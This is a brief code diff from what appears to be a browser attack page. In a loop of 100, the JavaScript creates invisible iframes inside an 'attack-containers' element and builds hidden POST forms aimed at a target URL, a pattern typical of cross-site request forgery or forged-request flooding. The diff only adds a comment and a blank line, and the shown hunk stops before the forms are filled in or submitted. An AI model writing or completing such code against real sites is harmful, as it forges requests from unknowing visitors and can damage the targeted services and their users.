@@ -100,12 +100,14 @@
             const container = document.getElementById("attack-containers");
 
             for (let i = 1; i <= 100; i++) {
+                // iframe is the response target
                 const iframe = document.createElement("iframe");
                 iframe.name = "hidden_frame_" + i;
                 iframe.style.display = "none";
                 // Now appending to the invisible container so we can get response back
                 container.appendChild(iframe);
 
+                
                 const form = document.createElement("form");
                 form.method = "POST";
                 form.action = targetUrl;
